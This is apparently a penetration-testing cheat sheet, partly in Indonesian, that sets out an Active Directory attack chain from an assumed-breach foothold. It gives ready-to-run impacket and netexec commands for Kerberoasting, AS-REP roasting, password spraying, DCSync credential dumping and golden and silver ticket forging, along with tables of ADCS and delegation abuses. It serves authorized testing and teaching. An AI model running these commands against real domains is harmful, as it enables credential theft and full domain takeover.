---
name: "Active Directory — Full Attack Chain"
description: "Active Directory attack chain: assumed breach, BloodHound enumeration, Kerberos attacks (AS-REP, Kerberoast), ADCS exploitation, delegation abuse, ACL abuse, DCSync, and golden/silver tickets."
tags: [active-directory, bloodhound, kerberos, adcs, dcsync, golden-ticket, delegation]
---

# Active Directory — Full Attack Chain

## Assumed Breach Mindset

Sebagian engagement dimulai dari assumed breach: klien memberi satu kredensial user domain biasa dan meminta bukti sejauh mana ia bisa bergerak. Pertanyaan pertama: apa yang bisa user ini akses, lihat, dan pengaruhi?

## Attack Chain Framework

```
Credentials → Enumerate Domain → Kerberoast/AS-REP → Lateral Movement
→ ACL/Delegation/ADCS Abuse → Domain Admin → DCSync
```

## Phase 1: Domain Enumeration

```bash
# BloodHound collection
bloodhound-python -d DOMAIN.LOCAL -u USER -p PASS -dc $DC -c All

# SMB enumeration
netexec smb $DC -u USER -p PASS --users

# LDAP enumeration
ldapsearch -x -H ldap://$DC -D "DOMAIN\USER" -w PASS -b "DC=DOMAIN,DC=LOCAL"
```

Enumeration adalah 80% dari AD attack. BloodHound adalah peta Anda.

## Phase 2: Kerberos Attacks

**AS-REP Roasting** (DONT_REQ_PREAUTH):
```bash
impacket-GetNPUsers DOMAIN/USER:PASS -request
```

**Kerberoasting** (TGS for service accounts):
```bash
impacket-GetUserSPNs DOMAIN/USER:PASS -request
```

**Password Spraying** (satu password, banyak users):
```bash
netexec smb $DC -u users.txt -p 'Password1' --continue-on-success
```

## Phase 3: ADCS Attacks

| ESC | Attack |
|-----|--------|
| ESC1 | Template with SAN + Client Auth EKU |
| ESC2 | Any Purpose EKU atau No EKU |
| ESC3 | Enrollment Agent abuse |
| ESC4 | Template ACL write access |
| ESC6 | EDITF_ATTRIBUTESUBJECTALTNAME2 on CA |
| ESC7 | ManageCA/ManageCertificates on CA |
| ESC8 | NTLM relay ke ADCS HTTP endpoint |

Tools: Certipy (Python), Certify (C#).

## Phase 4: Delegation Abuse

| Type | Exploitation |
|------|-------------|
| Unconstrained | Compromise server → extract TGTs |
| Constrained | S4U2Self/S4U2Proxy → impersonate user |
| RBCD | Abuse msDS-AllowedToActOnBehalfOfOtherIdentity |

## Phase 5: ACL Abuse

- GenericAll on user → Shadow Credentials, change password
- GenericAll on group → add yourself to Domain Admins
- WriteDACL on domain root → DCSync rights
- ForceChangePassword on privileged user
- ReadGMSAPassword → retrieve gMSA credentials

## Phase 6: Domain Dominance

**DCSync:**
```bash
impacket-secretsdump DOMAIN/USER:PASS@$DC
```

**Golden Ticket** (know krbtgt hash):
```bash
impacket-ticketer -nthash $KRBTGT_HASH -domain-sid $DOMAIN_SID -domain DOMAIN Administrator
```

**Silver Ticket** (know service account hash):
```bash
impacket-ticketer -nthash $HASH -domain-sid $SID -domain DOMAIN -spn cifs/TARGET Administrator
```

## Best Practices

- Jalankan BloodHound di awal dengan `-c All` sebelum mengejar jalur serangan.
- Enumeration > exploitation — mapping dulu, eksploitasi kemudian.
- Jangan asumsikan ADCS aktif; verifikasi template dan CA sebelum mengejar ESC.
- ADCS sering jadi jalur tercepat ke DA.
